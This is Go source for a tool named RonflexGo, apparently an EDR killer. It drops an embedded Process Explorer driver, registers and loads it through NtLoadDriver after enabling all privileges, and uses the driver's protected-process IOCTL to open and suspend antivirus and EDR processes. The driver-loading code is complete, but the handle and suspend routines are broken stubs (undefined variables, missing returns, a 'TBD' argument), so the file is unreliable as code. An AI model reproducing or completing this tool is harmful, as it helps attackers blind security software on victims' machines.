package main

import (
	_ "embed"
	"errors"
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"syscall"

	"github.com/fourcorelabs/wintoken"
	"golang.org/x/sys/windows"
	"golang.org/x/sys/windows/registry"
)

//go:embed Resources/Processes.txt
var content_processes string

//go:embed Resources/PROCEXP.sys
var driver []byte

func suspend_processes(traget_proc_handle windows.HANDLE, targets []string) error {
	windows.DeviceIoControl(traget_proc_handle, 0x7299c004, nil, 4, nil, 0, &local_1c, nil)

	return nil
}

func procexp_protected_process(volume_handle windows.HANDLE, pid int) (windows.HANDLE, error) {
	// 0x8335003c = IOCTL_OPEN_PROTECTED_PROCESS_HANDLE
	var handle windows.HANDLE = windows.NULL
	a, b, c := windows.DeviceIoControl(volume_handle, 0x8335003c, pid, len(pid))

}

func get_target_pid(process string) (int, error) {
	windows.Process32First()

}

func connect_procexp_device() (windows.HANDLE, error) {
	var handle windows.HANDLE
	var volume_name = fmt.Sprintf("\\\\.\\PROCEXP152")
	handle, err := windows.CreateFile(windows.StringToUTF16Ptr(volume_name), 0xc0000000, 0, nil, windows.OPEN_EXISTING, 0x80, 0)
	if err != nil {
		return nil, errors.New("[-] Error while creating volume for procexp")
	}

	return handle, nil
}

func unload_driver(drivername string) error {
	ntdll := syscall.NewLazyDLL("ntdll.dll")
	proc := ntdll.NewProc("NtUnloadDriver")

	registry := "HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\" + drivername

	namep, err := windows.UTF16PtrFromString(registry)
	if err != nil {
		return errors.New("[-] Error while converting name to unicode")
	}

	_, _, err = proc.Call(uintptr(*namep))

	// TODO: handle the driver errors ?
	fmt.Println("[INFO] Driver unloading result is:", err)

	return nil
}

func load_driver(drivername string) error {
	ntdll := syscall.NewLazyDLL("ntdll.dll")
	proc := ntdll.NewProc("NtLoadDriver")

	registry := "HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\" + drivername

	namep, err := windows.UTF16PtrFromString(registry)
	if err != nil {
		return errors.New("[-] Error while converting name to unicode")
	}

	_, _, err = proc.Call(uintptr(*namep))

	// TODO: handle the driver errors ?
	fmt.Println("[INFO] Driver loading result is:", err)

	return nil
}

func adjust_privilege() error {
	current_pid := windows.Getpid()

	token, err := wintoken.OpenProcessToken(current_pid, wintoken.TokenPrimary)
	if err != nil {
		return errors.New("[-] Error while getting current token handle")
	}
	defer token.Close()

	token.EnableAllPrivileges()

	return nil
}

func remove_registry_keys(drivername, driverpath string) error {
	err := registry.DeleteKey(registry.LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Services\\"+drivername)
	if err != nil {
		return errors.New("[-] Error while deleting registry key")
	} else {
		return nil
	}
}

func delete_driver(driverpath string) error {
	err := os.Remove(driverpath)
	if err != nil {
		return errors.New("[-] Error while erasing the driver from disk")
	} else {
		return nil
	}
}

func create_registry_keys(drivername, driverpath string) error {
	permission := uint32(registry.QUERY_VALUE | registry.SET_VALUE)
	key, _, err := registry.CreateKey(registry.LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Services\\"+drivername, permission)
	if err != nil {
		return errors.New("[-] Error while creating registry keys")
	}

	err = key.SetDWordValue("Type", 0)
	if err != nil {
		return errors.New("[-] Error while setting registry key Type")
	}

	err = key.SetDWordValue("ErrorControl", 0)
	if err != nil {
		return errors.New("[-] Error while setting registry key ErrorControl")
	}

	err = key.SetStringValue("ImagePath", driverpath)
	if err != nil {
		return errors.New("[-] Error while setting registry key ImagePath")
	}

	return nil
}

func write_driver(driver []byte) (string, error) {
	binary_name := "PROCEXP"
	f, err := os.Create(binary_name)
	if err != nil {
		return "", errors.New("[-] Error while creating PROCEXP file")
	}
	defer f.Close()

	_, err = f.Write(driver)
	if err != nil {
		return "", errors.New("[-] Error while writing bytes to PROCEXP file")
	}

	current_dir, err := os.Getwd()
	if err != nil {
		return "", errors.New("[-] Error while getting current working directory")
	}
	res := filepath.Join(current_dir, binary_name)

	return res, nil
}

func is_elevated() bool {
	// thanks to https://github.com/redcode-labs/Coldfire/blob/109a68f93162711068a110d8b29cca19061776d0/os_windows.go
	var is_elevated bool

	_, err := os.Open("\\\\.\\PHYSICALDRIVE0")
	if err != nil {
		is_elevated = false
	} else {
		is_elevated = true
	}
	return is_elevated
}

func load_process_names(content string) []string {
	var process_list []string
	for _, line := range strings.Split(strings.TrimSuffix(content, "\n"), "\n") {
		process_list = append(process_list, line)
	}
	return process_list
}

func check_args() (string, error) {
	switch len(os.Args) {
	case 1:
		fmt.Println("No argument given, RonflexGo will target all known AV/EDR processes")
		return "", nil
	case 2:
		fmt.Println("Argument provided, RonflexGo will target only", os.Args[1])
		return os.Args[1], nil
	default:
		return "", errors.New("[-] Incorrect number of arguments given")
	}
}

func check(e error) {
	if e != nil {
		panic(e)
	}
}

func main() {
	const DRIVERNAME string = "ProcExp64"

	if is_elevated() {
		fmt.Println("[+] Running with elevated rights, getting ready..")
	} else {
		fmt.Println("[-] Not running with elevated rights, exiting..")
		os.Exit(1)
	}

	arg, err := check_args()
	check(err)
	fmt.Println(arg)

	driverpath, err := write_driver(driver)
	check(err)
	fmt.Println("[+] Successfully wrote driver to disk")
	defer delete_driver(driverpath)

	err = create_registry_keys(DRIVERNAME, driverpath)
	check(err)
	fmt.Println("[+] Successfully wrote registry keys")
	defer remove_registry_keys(DRIVERNAME, driverpath)

	err = adjust_privilege()
	check(err)
	fmt.Println("[+] Successfully enabled all privileges for the current process")

	process_list := load_process_names(content_processes)
	fmt.Println(process_list)

	err = load_driver(DRIVERNAME)
	check(err)
	fmt.Println("[+] Successfully loaded PROCEXP driver")
	defer unload_driver(DRIVERNAME)

	volume_handle, err := connect_procexp_device()
	check(err)
	fmt.Println("[+] Successfully connected to PROCEXP driver")

	for i := 0; i < len(process_list); i++ {
		pid := get_target_pid()
		proc_handle, err := procexp_protected_process(volume_handle, pid)
		err = suspend_processes(TBD)
	}
}
